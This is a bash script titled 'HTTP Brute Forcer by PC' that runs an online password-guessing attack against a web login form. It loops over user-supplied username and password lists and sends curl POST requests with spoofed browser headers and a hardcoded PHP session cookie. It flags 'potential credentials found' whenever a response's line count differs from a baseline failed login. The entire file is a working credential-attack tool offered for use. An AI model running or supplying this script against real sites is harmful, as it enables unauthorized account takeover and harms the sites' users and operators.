#!/bin/bash
# HTTP Brute Forcer by PC
lgreen="\33[1;32m"
green="\33[0;32m"
red="\33[1;31m"

function checkExist(){
        if [ ! -e $1 ]; then
                echo "The file ${1} does not exist"
                exit 0
        fi
}

function displayHelp(){
        echo "-P Password list for brute force"
        echo "-p Specific password"
        echo "-U User list for brute force"
        echo "-u Specific user"
        echo "-H Host/ Login page to brute force"
	echo "-M Parameters Format: 'username:password'"
	exit 0
}

function setParams(){
        if [ ! -z "$userParam" ] || [ ! -z "$passParam" ]; then
                echo "Error please provide parameters only once!"
                exit 0
        else
  		export userParam=$(echo "$1" | cut -d : -f 1)
		export passParam=$(echo "$1" | cut -d : -f 2)
                echo "Username Parameter: " $userParam
		echo "Password Parameter: " $passParam
	fi
}

function setUser(){
	if [ ! -z "$username" ]; then
		echo "Error please provide only 1 username or list file!"
		exit 0
	else
		export username=$1
		echo "Username: "$username
	fi
}

function setUserPath(){
        if [ ! -z "$usernameList" ]; then
                echo "Error please provide only 1 username or list file!"
                exit 0
        else
		checkExist $1
                export usernameList=$1
                echo "Username List: " $usernameList
        fi
}


function setPass(){
	if [ ! -z "$password" ]; then
		echo "Error please provide only 1 password or list file!"
		exit 0
	else
		export password=$1
		echo "Password: " $password
	fi
}

function setPassPath(){
        if [ ! -z "$passwordList" ]; then
                echo "Error please provide only 1 password or list file!"
                exit 0
        else
		checkExist $1
                export passwordList=$1
                echo "Password List: " $passwordList
        fi
}

function setHost(){
	 if [ ! -z "$host" ]; then
                echo "Error please provide only 1 host!"
                exit 0
        else
                export host=$1
                echo "Host: " $host
        fi
}

while getopts 'hP:p:U:u:H:M:' option; do
	case ${option} in
	h ) displayHelp ;;
	P ) setPassPath ${OPTARG};;
	p ) setPass ${OPTARG} ;;
	U ) setUserPath ${OPTARG} ;;
	u ) setUser ${OPTARG} ;;
	H ) setHost ${OPTARG} ;;
	M ) setParams ${OPTARG} ;;
	? ) echo "Illegal expression, try -h." ;;
	esac
done

if [ -z $host ]; then
	echo "Please provide a Host!"
	exit 0

elif [ -z $passwordList ] && [ -z $password ]; then
	echo "Please provide a Password or List File!"
	exit 0

elif [ -z $usernameList ] &&  [ -z $username ]; then
	echo "Please provide a Username or List File!"
	exit 0

elif [ -z $userParam ] ||  [ -z $passParam ]; then
        echo "Please provide both Username Parameter and Password Parameter!"
        exit 0


elif [ -z $password ] && [ -z $username ]; then
	printf "\nRunning attack using Username and Password Lists:\n\n"

	curl $host -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=vaa26lj0vvaj2n9iqo0770lvj5bf4a' --data-raw "${userParam}=Test&${passParam}=Test" -L > baseRes
        baseLen=$(cat baseRes | wc -l)

	while IFS= read -r user
        do
		while IFS= read -r pass
        	do
                	curl $host -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=vaa26lj0vvaj2n9iqo0770lvj5bf4a' --data-raw "${userParam}=${user}&${passParam}=${pass}" -L > testRes
                	testLen=$(cat testRes | wc -l)
			echo "${user} ${pass} ${baseLen} ${testLen}"
                	if [ $baseLen != $testLen ]; then
                        	printf "\n\n${green}Potential credentials found, ${lgreen}${user}:${pass}\n\n"
                        	rm baseRes testRes
				exit 0
                	fi
        	done < $passwordList

        done < $usernameList

elif [ -z $passwordList ] && [  -z $usernameList ]; then
	printf "\nRunning attack using Username and Password, ${username} ${password}:\n\n"

	curl $host -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=vaa26lj0vvaj2n9iqo0770lvj5bf4a' --data-raw "${userParam}=Test&${passParam}=Test" -L > baseRes
	baseLen=$(cat baseRes | wc -l)

	curl $host -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=vaa26lj0vvaj2n9iqo0b70lvj5bf4a' --data-raw "${userParam}=${username}&${passParam}=${password}" -L > testRes
	testLen=$(cat testRes | wc -l)

	if [ $baseLen != $testLen ]; then
		printf "\n\n${green}Potential credentials found, ${lgreen}${username}:${password}\n\n"
		rm baseRes testRes
		exit 0
	fi

elif  [ -z $username ]; then
	printf "\nRunning attack user Username List and Password, ${password}:\n\n"

	curl $host -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=vaa26lj0vvaj2n9iqo0b70lvj5bf4a' --data-raw "${userParam}=Test&${passParam}=${password}" -L > baseRes
        baseLen=$(cat baseRes | wc -l)

	while IFS= read -r user
	do
  		curl $host -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=vaa26lj0vvaj2n9iqo0b70lvj5bf4a' --data-raw "${userParam}=${user}&${passParam}=${password}" -L > testRes
	        testLen=$(cat testRes | wc -l)

        	if [ $baseLen != $testLen ]; then
                	printf "\n\n${green}Potential credentials found, ${lgreen}${user}:${password}\n\n"
			rm baseRes testRes
			exit 0
        	fi
	done < $usernameList

elif [ -z $password ]; then
	printf "\nRunning attack using Password List and Username, ${username}:\n\n"

	curl $host -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=vaa26lj0vvaj2n9iqo0b70lvj5bf4a' --data-raw "${userParam}=${username}&${passParam}=Test" -L > baseRes
        baseLen=$(cat baseRes | wc -l)

        while IFS= read -r pass
        do
                curl $host -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=vaa26lj0vvaj2n9iqo0b70lvj5bf4a' --data-raw "${userParam}=${username}&${passParam}=${pass}" -L > testRes
                testLen=$(cat testRes | wc -l)

                if [ $baseLen != $testLen ]; then
			printf "\n\n${green}Potential credentials found, ${lgreen}${username}:${pass}\n\n"
                        rm baseRes testRes
			exit 0
                fi
        done < $passwordList
fi

rm baseRes testRes
printf "\n\n${red}No credentials found :(\n\n"
